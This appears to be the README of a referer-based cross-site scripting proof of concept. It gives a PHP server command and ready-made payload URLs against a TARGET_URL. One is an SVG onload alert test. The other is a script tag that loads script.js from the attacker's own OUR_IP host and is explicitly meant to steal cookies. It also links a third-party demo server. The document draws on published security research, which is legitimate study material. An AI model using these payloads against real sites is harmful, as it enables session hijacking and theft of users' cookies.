## Referer-based XSS PoC

### Starting the server

Start the server from the repo directory with:
```
php -S 0.0.0.0:80
```

### Example

for testing:
```
[http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=TARGET_URL]
```

or to steal cookies:
```
[http://OUR_IP<script src=http://OUR_IP/script.js></script>?target=TARGET_URL]
```

Code based on what's discussed at Geekboy's blog here:
https://www.geekboy.ninja/blog/exploiting-unusual-referer-based-xss/

Geekboy also set up a vulnerable server for testing as discussed in the blog entry linked above. This link works as a test of our index.php file:
```
http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php
```

He set up a PoC here which is the same as index.php. You can click this link directly as is:
[http://p0c.geekboy.ninja/rxss.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php](http://p0c.geekboy.ninja/rxss.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php)

*Note: Replace OUR_IP and TARGET_URL as appropriate.*

